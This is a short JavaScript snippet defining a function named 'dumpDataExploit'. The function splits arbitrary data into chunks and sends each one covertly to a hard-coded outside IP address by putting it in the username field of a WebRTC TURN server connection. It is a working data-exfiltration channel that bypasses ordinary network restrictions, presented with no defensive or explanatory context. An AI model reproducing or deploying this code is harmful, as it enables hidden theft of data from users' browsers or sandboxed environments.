/**
 *
 */
const connectionCode = "zeta:v5.1:71.191.41.44:47777:6233994904256512";

const [zeta, version, serverIp, serverPort, handshakeProgramId] =
  connectionCode.split(":");

const dumpDataExploit = async (data, chunkSize = 128) => {
  const identifier = Math.random().toString(36).substring(7);
  const dataChunkSize = chunkSize - identifier.length - 2;
  let chunkNumber = 0;
  for (let i = 0; i < data.length; i += dataChunkSize) {
    const chunk = `${identifier}:${chunkNumber
      .toString()
      .padStart(2, "0")}:${data.substring(i, i + dataChunkSize)}`;
    new RTCPeerConnection({
      iceServers: [
        {
          urls: [`turn:${serverIp}:${serverPort}`],
          username: chunk,
          credential: "1",
        },
      ],
      iceCandidatePoolSize: 1,
    });
    chunkNumber++;
  }
};
